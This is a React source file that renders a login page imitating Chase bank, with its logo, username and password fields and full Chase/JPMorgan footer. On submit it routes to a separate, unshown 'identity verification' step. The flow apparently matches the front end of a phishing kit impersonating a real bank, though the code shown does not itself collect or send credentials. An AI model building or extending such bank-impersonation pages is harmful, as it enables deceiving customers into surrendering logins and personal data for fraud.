import { useState } from 'react'
import { BrowserRouter, Routes, Route, useNavigate } from 'react-router-dom'
import './App.css'
import logo from './assets/logo.svg'
import IdentityVerification from './components/IdentityVerification'

function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const navigate = useNavigate();

  const togglePassword = (e) => {
    e.preventDefault();
    setShowPassword(!showPassword);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate('/verify');
  };

  return (
    <div className="app-container">
      <header className="main-header">
        <div className="logo-container">
          <img 
            src={logo} 
            alt="Chase Logo" 
            className="chase-logo" 
          />
        </div>
      </header>

      <main className="login-page">
        <section className="login-container">
          <div className="login-card">
            <form className="login-form" onSubmit={handleSubmit}>
              <div className="input-group">
                <label htmlFor="username">Username</label>
                <input type="text" id="username" name="username" required />
              </div>
              <div className="input-group password-group">
                <label htmlFor="password">Password</label>
                <div className="password-wrapper">
                  <input 
                    type={showPassword ? "text" : "password"} 
                    id="password" 
                    name="password" 
                    required 
                  />
                  <button 
                    type="button"
                    className="show-password" 
                    onClick={togglePassword}
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
              </div>
              <div className="form-options">
                <label className="checkbox-container">
                  <input type="checkbox" />
                  Remember me
                </label>
                <label className="checkbox-container">
                  <input type="checkbox" />
                  Use token
                </label>
              </div>
              <button type="submit" className="sign-in-btn">Sign in</button>
              <div className="login-links">
                <a href="#" className="forgot-link">
                  Forgot username/password? <i className="fa-solid fa-angle-right"></i>
                </a>
                <a href="#" className="signup-link">
                  Not enrolled? Sign up now. <i className="fa-solid fa-angle-right"></i>
                </a>
              </div>
            </form>
          </div>
        </section>
      </main>

      <footer className="main-footer">
        <div className="social-icons">
          <a href="#"><i className="fa-brands fa-facebook-square"></i></a>
          <a href="#"><i className="fa-brands fa-instagram"></i></a>
          <a href="#"><i className="fa-brands fa-x-twitter"></i></a>
          <a href="#"><i className="fa-brands fa-youtube"></i></a>
          <a href="#"><i className="fa-brands fa-linkedin"></i></a>
        </div>
        <nav className="footer-links">
          <a href="#">Contact us</a>
          <a href="#">Privacy & security</a>
          <a href="#">Terms of use</a>
          <a href="#">Accessibility</a>
          <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
          <a href="#">Fair Lending</a>
          <a href="#">About Chase</a>
          <a href="#">J.P. Morgan</a>
          <a href="#">JPMorgan Chase & Co.</a>
          <a href="#">Careers</a>
          <a href="#">Español</a>
          <a href="#">Chase Canada</a>
        </nav>
        <div className="footer-bottom">
          <nav className="secondary-footer-links">
            <a href="#">Site map</a>
            <a href="#">Member FDIC</a>
            <a href="#" className="equal-housing">
              Equal Housing Opportunity
            </a>
          </nav>
          <p className="copyright">&copy; 2026 JPMorganChase & Co.</p>
        </div>
      </footer>
    </div>
  );
}

function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<LoginPage />} />
        <Route path="/verify" element={<IdentityVerification />} />
      </Routes>
    </BrowserRouter>
  )
}

export default App
